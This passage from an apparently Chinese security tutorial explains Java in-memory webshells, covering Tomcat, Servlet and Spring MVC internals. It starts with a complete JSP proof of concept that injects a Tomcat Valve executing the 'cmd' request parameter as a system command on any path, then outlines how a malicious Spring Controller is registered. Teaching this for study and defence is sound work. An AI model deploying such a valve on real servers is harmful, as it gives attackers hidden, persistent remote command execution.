<span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Valve</span>();<br>    pipeline.addValve(shell_valve);<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="完整POC-3"><a href="#完整POC-3" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>%&gt;<br> <br>&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Valve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Shell_Valve</span> <span class="hljs-variable">shell_valve</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Valve</span>();<br>    pipeline.addValve(shell_valve);<br>%&gt;<br></code></pre></td></tr></table></figure><p>访问Valve.jsp</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-48.png" alt="img27"></p><p>任意路径即可命令执行</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-49.png" alt="img28"></p><h2 id="Spring内存马"><a href="#Spring内存马" class="headerlink" title="Spring内存马"></a>Spring内存马</h2><h3 id="什么是Spring"><a href="#什么是Spring" class="headerlink" title="什么是Spring"></a>什么是Spring</h3><p>Spring是一个轻量级的Java开源框架，用于配置、管理和维护Bean（组件）的一种框架，其核心理念就是<strong>IoC(Inversion of Control,控制反转)</strong> 和 **AOP(AspectOrientedProgramming， 面向切面编程)**。现如今Spring全家桶已是一个庞大的家族</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/1.webp" alt="img29"></p><p>Spring的出现大大简化了JavaEE的开发流程，减少了Java开发时各种繁琐的配置。</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/14795543-ac51408a17d53289.webp" alt="img30"></p><p>Spring框架的核心之一就是分层，其由许多大大小小的组件构成，每种组件都实现不同功能。</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/14795543-37dab574499d0f4a.webp" alt="img31"></p><h4 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h4><p>SpringBoot 基于 Spring 开发。不仅继承了Spring框架原有的优秀特性，它并不是用来替代 Spring 的解决方案，而和 Spring 框架紧密 结合进一步简化了Spring应用的整个搭建和开发过程。其设计目的是用来简化 Spring 应用的初始搭建以及开发过程。</p><p>采用 Spring Boot 可以大大的简化开发模式，它集成了大量常用的第三方库配置，所有你想集成的常用框架，它都有对应的组件支持，例如 Redis、MongoDB、Dubbo、kafka，ES等等。SpringBoot 应用中这些第 三方库几乎可以零配置地开箱即用，大部分的 SpringBoot 应用都只需要非常少量的配置代码，开发者能够更加专注于业务逻辑。 另外SpringBoot通过集成大量的框架使得依赖包的版本冲突，以及引用的不稳定性等问题得到了很好的解决。</p><p>下面我们就通过IDEA中的Spring Initializr来快速构建一个基于SpringBoot的Web项目</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-50.png" alt="img32"></p><p>选择Spring Web</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-51.png" alt="img33"></p><p>创建好之后，IDEA会自动创建一个启动类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.spring;<br> <br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br> <br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(Application.class, args);<br>    &#125;<br> <br>&#125;<br></code></pre></td></tr></table></figure><p>下面我们就可以编写相应的Controller（控制器）及各种业务逻辑了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.helloworld.controller;<br> <br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br> <br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorldController</span> &#123;<br> <br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">Hello</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-52.png" alt="img34"></p><h4 id="Spring-MVC、Tomcat和Servlet"><a href="#Spring-MVC、Tomcat和Servlet" class="headerlink" title="Spring MVC、Tomcat和Servlet"></a>Spring MVC、Tomcat和Servlet</h4><p>首先来设想这样一个场景，假如让我们自己手动实现一个简易的Web服务器，我们会怎么做？</p><p>首先我们肯定要接收客户端发来的TCP数据包，这里我们需要一个TCPServer来监听80端口。接着我们需要将TCP数据包解析成HTTP协议，获取URL路径、参数列表等数据信息。再然后就是执行各种逻辑处理。最后就是把处理的结果封装成HTTP协议返回给浏览器，并且等浏览器收到响应后断开连接。以上就是一个简易Web服务器的实现逻辑，当然，真正的Web服务器可能要比上述更加复杂一些，但核心功能是不变的：接受请求、处理请求、返回响应。</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/12652505-b014ed371a9ea749.webp" alt="img35"></p><p>当然，如果我们在处理业务时每次都要进行一遍上述流程，这未免太繁琐。其实我们可以发现在上述流程中，网络通信、HTTP协议解析和封装部分的实现都相对固定。有变化的部分其实只有逻辑处理器，需要我们根据不同请求包而做出相应的逻辑处理。因此，为了提高开发效率，我们能不能将不变的部分封装起来呢？这其实就是我们的Web服务器。</p><p>Tomcat就是这样一种服务器，它其实就是一个能够监听TCP连接请求，解析HTTP报文，将解析结果传给处理逻辑器、接收处理逻辑器的返回结果并通过TCP返回给浏览器的一个框架。在Tomcat各种组件中，Connnector就是负责网络通信的，而Container中的Servlet就是我们的逻辑处理器。</p><p><img src="https://goodapple.top/wp-content/uploads/2022/04/Tomcat-1.png" alt="img36"></p><p>因此Tomcat就是一个Servlet容器，它将前后端交互过程中不变的东西（网络通信、协议解析等）封装了起来。而Servlet是一个逻辑处理器，它可以被Tomcat创建、调用和销毁。所以我们的Web程序核心是基于Servlet的，而Web程序的启动依靠Tomcat。</p><p>那Spring MVC呢？Spring是利用注解、反射和模板等技术实现的一种框架。其核心类是继承于HttpServlet的DispatchServlet。那既然是Servlet，那负责的肯定就是逻辑处理部分了，那么就需要Tomcat这样的服务器来给Spring提供运行环境。</p><h4 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring MVC"></a>Spring MVC</h4><h5 id="Spring-MVC的运行流程"><a href="#Spring-MVC的运行流程" class="headerlink" title="Spring MVC的运行流程"></a>Spring MVC的运行流程</h5><p><img src="https://goodapple.top/wp-content/uploads/2022/05/1571816061.png" alt="img37"></p><p>客户端发送Request，DispatcherServlet(等同于Controller控制器)，控制器接收到请求，来到HandlerMapping（在配置文件中配置），HandlerMapping会对URL进行解析，并判断当前URL该交给哪个Controller来处理，找到对应的Controller之后，Controller就跟Server、JavaBean进行交互，得到某一个值，并返回一个视图（ModelAndView过程），Dispathcher通过ViewResolver视图解析器,找到ModelAndView对象指定的视图对象,最后，视图对象负责渲染返回给客户端。</p><h5 id="创建一个简单的Spring-MVC项目"><a href="#创建一个简单的Spring-MVC项目" class="headerlink" title="创建一个简单的Spring MVC项目"></a>创建一个简单的Spring MVC项目</h5><p>这里我们使用Maven来创建一个简单的SpringMVC项目。创建好Maven项目后添加相应的Springmvc依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br>&lt;properties&gt;<br>    &lt;project.build.sourceEncoding&gt;UTF-<span class="hljs-number">8</span>&lt;/project.build.sourceEncoding&gt;<br>    &lt;maven.compiler.source&gt;<span class="hljs-number">1.7</span>&lt;/maven.compiler.source&gt;<br>    &lt;maven.compiler.target&gt;<span class="hljs-number">1.7</span>&lt;/maven.compiler.target&gt;<br>    &lt;org.springframework-version&gt;<span class="hljs-number">4.1</span><span class="hljs-number">.4</span>.RELEASE&lt;/org.springframework-version&gt;<br>  &lt;/properties&gt;<br> <br>  &lt;dependencies&gt;<br>    &lt;dependency&gt;<br>      &lt;groupId&gt;junit&lt;/groupId&gt;<br>      &lt;artifactId&gt;junit&lt;/artifactId&gt;<br>      &lt;version&gt;<span class="hljs-number">4.11</span>&lt;/version&gt;<br>      &lt;scope&gt;test&lt;/scope&gt;<br>    &lt;/dependency&gt;<br>    &lt;dependency&gt;<br>      &lt;groupId&gt;org.springframework&lt;/groupId&gt;<br>      &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;<br>      &lt;version&gt;$&#123;org.springframework-version&#125;&lt;/version&gt;<br>    &lt;/dependency&gt;<br>    &lt;dependency&gt;<br>      &lt;groupId&gt;org.springframework&lt;/groupId&gt;<br>      &lt;artifactId&gt;spring-web&lt;/artifactId&gt;<br>      &lt;version&gt;$&#123;org.springframework-version&#125;&lt;/version&gt;<br>    &lt;/dependency&gt;<br> <br>    &lt;!-- Tag libs support <span class="hljs-keyword">for</span> view layer --&gt;<br>    &lt;dependency&gt;<br>      &lt;groupId&gt;javax.servlet&lt;/groupId&gt;<br>      &lt;artifactId&gt;jstl&lt;/artifactId&gt;<br>      &lt;version&gt;<span class="hljs-number">1.2</span>&lt;/version&gt;<br>      &lt;scope&gt;runtime&lt;/scope&gt;<br>    &lt;/dependency&gt;<br>    &lt;dependency&gt;<br>      &lt;groupId&gt;taglibs&lt;/groupId&gt;<br>      &lt;artifactId&gt;standard&lt;/artifactId&gt;<br>      &lt;version&gt;<span class="hljs-number">1.1</span><span class="hljs-number">.2</span>&lt;/version&gt;<br>      &lt;scope&gt;runtime&lt;/scope&gt;<br>    &lt;/dependency&gt;<br> <br>  &lt;/dependencies&gt;<br>...<br></code></pre></td></tr></table></figure><p>创建Spring配置文件<code>springmvc.xml</code></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-57.png" alt="img37"></p><p>编写<code>web.xml</code>文件来配置Servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;web-app xmlns=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br>         xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>         xsi:schemaLocation=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br>         version=<span class="hljs-string">&quot;4.0&quot;</span>&gt;<br> <br>  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;<br> <br>  <span class="hljs-comment">//使用默认的DispatcherServlet</span><br>  &lt;servlet&gt;<br>    &lt;servlet-name&gt;spring&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;<br>    &lt;init-param&gt;<br>      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;<br>       <span class="hljs-comment">//spring配置文件路径</span><br>      &lt;param-value&gt;/WEB-INF/springmvc.xml&lt;/param-value&gt;<br>    &lt;/init-param&gt;<br>    &lt;load-on-startup&gt;<span class="hljs-number">1</span>&lt;/load-on-startup&gt;<br>  &lt;/servlet&gt;<br> <br>  &lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;spring&lt;/servlet-name&gt;<br>    <span class="hljs-comment">//路径设置为根目录</span><br>    &lt;url-pattern&gt;/&lt;/url-pattern&gt;<br>  &lt;/servlet-mapping&gt;<br> <br> <br>&lt;/web-app&gt;<br></code></pre></td></tr></table></figure><p>配置springmvc.xml</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>       xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xmlns:mvc=<span class="hljs-string">&quot;http://www.springframework.org/schema/mvc&quot;</span><br>       xmlns:context=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span><br>       xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;<br> <br>    <span class="hljs-comment">//设置注解扫描包路径</span><br>    &lt;context:component-scan base-<span class="hljs-keyword">package</span>=<span class="hljs-string">&quot;com.controller&quot;</span>/&gt;<br> <br>    &lt;!-- 开启springMVC的注解驱动，使得url可以映射到对应的controller --&gt;<br>    &lt;mvc:annotation-driven /&gt;<br> <br>    &lt;!-- 视图解析 --&gt;<br>    &lt;bean class=<span class="hljs-string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;<br>        &lt;property name=<span class="hljs-string">&quot;prefix&quot;</span> value=<span class="hljs-string">&quot;/WEB-INF/views/&quot;</span>/&gt;<br>        &lt;property name=<span class="hljs-string">&quot;suffix&quot;</span> value=<span class="hljs-string">&quot;.jsp&quot;</span>/&gt;<br>    &lt;/bean&gt;<br> <br> <br>&lt;/beans&gt;<br></code></pre></td></tr></table></figure><p>在<code>com.controller</code>包下创建test控制器</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-58.png" alt="img38"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.controller;<br> <br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br> <br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br> <br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>配置Tomcat，添加相应war包</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-59.png" alt="img39"></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-60.png" alt="img40"></p><p>启动Tomcat，访问<code>http://localhost/hello</code></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-61.png" alt="img41"></p><h3 id="Controller型内存马"><a href="#Controller型内存马" class="headerlink" title="Controller型内存马"></a>Controller型内存马</h3><h4 id="Bean"><a href="#Bean" class="headerlink" title="Bean"></a>Bean</h4><p><code>Bean</code> 是 Spring 框架的一个<strong>核心概念</strong>，它是构成应用程序的主干，并且是由 <code>Spring IoC</code> 容器负责实例化、配置、组装和管理的对象。</p><ul><li>bean 是对象</li><li>bean 被 IoC 容器管理</li><li>Spring 应用主要是由一个个的 bean 构成的</li></ul><h4 id="IOC容器"><a href="#IOC容器" class="headerlink" title="IOC容器"></a>IOC容器</h4><p>如果一个系统有大量的组件（类），其生命周期和相互之间的依赖关系如果由组件自身来维护，不但大大增加了系统的复杂度，而且会导致组件之间极为紧密的耦合，继而给测试和维护带来了极大的困难。解决这一问题的核心方案就是IoC（又称为依赖注入）。由IoC负责创建组件、根据依赖关系组装组件、按依赖顺序正确销毁组件。</p><p>IOC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用<code>xml</code>、<code>Java注解</code>或<code>Java代码</code>来表示。</p><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>Spring 框架中，<code>BeanFactory</code> 接口是 <code>Spring</code> <strong>IoC容器</strong> 的实际代表者</p><p>Spring容器就是ApplicationContext，它是一个接口继承于BeanFactory，有很多实现类。获得了ApplicationContext的实例，就获得了IoC容器的引用。我们可以从ApplicationContext中可以根据Bean的ID获取Bean。</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-55.png" alt="img42"></p><p>因此，<code>org.springframework.context.ApplicationContext</code>接口也代表了 <code>IoC容器</code> ，它负责实例化、定位、配置应用程序中的对象(<code>bean</code>)及建立这些对象间(<code>beans</code>)的依赖。</p><h4 id="Root-Context和Child-Context"><a href="#Root-Context和Child-Context" class="headerlink" title="Root Context和Child Context"></a>Root Context和Child Context</h4><p>我们来看看web.xml配置文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br>  &lt;servlet&gt;<br>    &lt;servlet-name&gt;spring&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;<br>    &lt;init-param&gt;<br>      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;<br>      &lt;param-value&gt;/WEB-INF/springmvc.xml&lt;/param-value&gt;<br>    &lt;/init-param&gt;<br>    &lt;load-on-startup&gt;<span class="hljs-number">1</span>&lt;/load-on-startup&gt;<br>  &lt;/servlet&gt;<br>  &lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;spring&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/&lt;/url-pattern&gt;<br>  &lt;/servlet-mapping&gt;<br>...<br></code></pre></td></tr></table></figure><p>这里我们将DispatcherServlet设置别名为spring，然后将<code>contextConfigLocation</code> 参数值配置为<code>/WEB-INF/springmvc.xml</code>。</p><p>依照规范，当没有显式配置 <code>contextConfigLocation</code> 时，程序会自动寻找 &#96;&#96;&#x2F;WEB-INF&#x2F;<servlet-name>-servlet.xml<code>，作为配置文件。因为上面的 </code><servlet-name><code>是</code>dispatcherServlet<code>，所以当没有显式配置时，程序依然会自动找到 </code>&#x2F;WEB-INF&#x2F;dispatcherServlet-servlet.xml&#96; 配置文件。</servlet-name></servlet-name></p><p>每个具体的 <code>DispatcherServlet</code> 创建的是一个 <code>Child Context</code>，代表一个独立的 <code>IoC 容器</code>；而 <code>ContextLoaderListener</code> 所创建的是一个 <code>Root Context</code>，代表全局唯一的一个公共 <code>IoC 容器</code>。</p><p>如果要访问和操作 <code>bean</code> ，一般要获得当前代码执行环境的<code>IoC 容器</code> 代表者 <code>ApplicationContext</code>。</p><ul><li>Spring 应用中可以同时有多个 <code>Context</code>，其中只有一个 <code>Root Context</code>，剩下的全是 <code>Child Context</code></li><li>所有<code>Child Context</code>都可以访问在 <code>Root Context</code>中定义的 <code>bean</code>，但是<code>Root Context</code>无法访问<code>Child Context</code>中定义的 <code>bean</code></li><li>所有的<code>Context</code>在创建后，都会被作为一个属性添加到了 <code>ServletContext</code>中</li></ul><h4 id="ContextLoaderListener"><a href="#ContextLoaderListener" class="headerlink" title="ContextLoaderListener"></a>ContextLoaderListener</h4><p><code>ContextLoaderListener</code> 主要被用来初始化全局唯一的<code>Root Context</code>，即 <code>Root WebApplicationContext</code>。这个 <code>Root WebApplicationContext</code> 会和其他 <code>Child Context</code> 实例共享它的 <code>IoC 容器</code>，供其他 <code>Child Context</code> 获取并使用容器中的 <code>bean</code>。</p><h4 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h4><p>和Tomcat内存马类似，我们就需要了解如何动态的注册Controller，思路如下</p><ol><li>获取上下文环境</li><li>注册恶意Controller</li><li>配置路径映射</li></ol><h4 id="获取上下文环境Context"><a href="#获取上下文环境Context" class="headerlink" title="获取上下文环境Context"></a>获取上下文环境Context</h4><p>有四种方法</p><h5 id="getCurrentWebApplicationContext"><a href="#getCurrentWebApplicationContext" class="headerlink" title="getCurrentWebApplicationContext"></a><strong>getCurrentWebApplicationContext</strong></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> ContextLoader.getCurrentWebApplicationContext();<br></code></pre></td></tr></table></figure><p><code>getCurrentWebApplicationContext</code> 获得的是一个 <code>XmlWebApplicationContext</code> 实例类型的 <code>Root WebApplicationContext</code>。</p><h5 id="WebApplicationContextUtils"><a href="#WebApplicationContextUtils" class="headerlink" title="WebApplicationContextUtils"></a>WebApplicationContextUtils</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());<br></code></pre></td></tr></table></figure><p><em>通过这种方法获得的也是一个</em> <code>Root WebApplicationContext</code>。其中 <code>WebApplicationContextUtils.getWebApplicationContext</code> 函数也可以用 <code>WebApplicationContextUtils.getRequiredWebApplicationContext</code>来替换。</p><h5 id="RequestContextUtils"><a href="#RequestContextUtils" class="headerlink" title="RequestContextUtils"></a><strong>RequestContextUtils</strong></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());<br></code></pre></td></tr></table></figure><p><em>通过</em> 